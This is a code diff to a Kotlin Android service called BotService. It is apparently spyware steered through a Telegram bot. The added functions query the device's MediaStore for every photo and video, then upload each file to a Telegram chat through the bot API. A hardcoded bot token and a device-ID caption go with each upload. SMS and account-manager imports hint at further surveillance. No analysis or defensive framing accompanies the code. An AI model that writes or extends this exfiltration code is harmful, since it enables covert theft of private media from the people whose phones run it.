@@ -4,19 +4,15 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
-import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
-import android.database.Cursor
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
-import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
 import android.accounts.AccountManager
 import android.provider.MediaStore
-import android.provider.OpenableColumns
 import android.telephony.SmsManager
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
@@ -27,9 +23,7 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
-import java.io.ByteArrayOutputStream
 import java.io.File
-import java.io.FileOutputStream
 import java.util.concurrent.TimeUnit
 
 class BotService : Service() {
@@ -227,12 +221,12 @@ class BotService : Service() {
     private fun handlePhoto(chatId: Long) {
         Thread {
             try {
+                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                 val projection = arrayOf(
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DATA,
                     MediaStore.Images.Media.SIZE
                 )
-                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                 val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.SIZE + " ASC")
                 val images = mutableListOf<Pair<String, Long>>()
                 cursor?.use { c ->
@@ -291,23 +285,36 @@ class BotService : Service() {
         } catch (e: Exception) {
             for (file in files) {
                 try {
-                    val main = MainActivity.getInstance()
-                    main?.sendTelegramPhoto(chatId, file.readBytes(), "Device ID: $deviceId")
+                    sendSinglePhoto(chatId, file)
                     Thread.sleep(500)
                 } catch (e2: Exception) {}
             }
         }
     }
 
+    private fun sendSinglePhoto(chatId: Long, file: File) {
+        try {
+            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendPhoto"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId.toString())
+                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
+                .addFormDataPart("caption", "Device ID: $deviceId")
+                .build()
+            val request = Request.Builder().url(url).post(requestBody).build()
+            client.newCall(request).execute().close()
+        } catch (e: Exception) {}
+    }
+
     private fun handleVideo(chatId: Long) {
         Thread {
             try {
+                val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                 val projection = arrayOf(
                     MediaStore.Video.Media._ID,
                     MediaStore.Video.Media.DATA,
                     MediaStore.Video.Media.SIZE
                 )
-                val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                 val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Video.Media.SIZE + " ASC")
                 val videos = mutableListOf<Pair<String, Long>>()
                 cursor?.use { c ->
@@ -324,9 +331,7 @@ class BotService : Service() {
                     return@Thread
                 }
                 sendMessage(chatId, "Found ${videos.size} videos. Sending within size limits...")
-                var batch = mutableListOf<File>()
                 var batchCount = 0
-                var batchSize = 0L
                 for ((path, size) in videos) {
                     val file = File(path)
                     if (!file.exists()) continue
@@ -334,40 +339,32 @@ class BotService : Service() {
                         sendMessage(chatId, "Skipping video (too large: ${size / 1024 / 1024}MB): ${file.name}")
                         continue
                     }
-                    if (batchSize + size > maxVideoSize || batch.size >= 10) {
-                        if (batch.isNotEmpty()) {
-                            batchCount++
-                            sendVideoBatch(chatId, batch, batchCount)
-                            batch = mutableListOf()
-                            batchSize = 0L
-                            Thread.sleep(2000)
-                        }
-                    }
-                    batch.add(file)
-                    batchSize += size
-                }
-                if (batch.isNotEmpty()) {
                     batchCount++
-                    sendVideoBatch(chatId, batch, batchCount)
+                    sendSingleVideo(chatId, file)
+                    Thread.sleep(1500)
                 }
-                sendMessage(chatId, "Sent $batchCount video batches. Device ID: $deviceId")
+                sendMessage(chatId, "Sent $batchCount videos. Device ID: $deviceId")
             } catch (e: Exception) {
                 sendMessage(chatId, "Video command error: ${e.message}")
             }
         }.start()
     }
 
-    private fun sendVideoBatch(chatId: Long, files: List<File>, batchNum: Int) {
-        for (file in files) {
-            try {
-                val main = MainActivity.getInstance()
-                main?.sendTelegramVideo(chatId, file, "Device ID: $deviceId")
-                Thread.sleep(1500)
-            } catch (e: Exception) {}
-        }
+    private fun sendSingleVideo(chatId: Long, file: File) {
+        try {
+            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendVideo"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId.toString())
+                .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
+                .addFormDataPart("caption", "Device ID: $deviceId")
+                .build()
+            val request = Request.Builder().url(url).post(requestBody).build()
+            client.newCall(request).execute().close()
+        } catch (e: Exception) {}
     }
 
-    fun sendMessage(chatId: Long, text: String) {
+    private fun sendMessage(chatId: Long, text: String) {
         try {
             val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendMessage"
             val json = gson.toJson(mapOf("chat_id" to chatId.toString(), "text" to text))
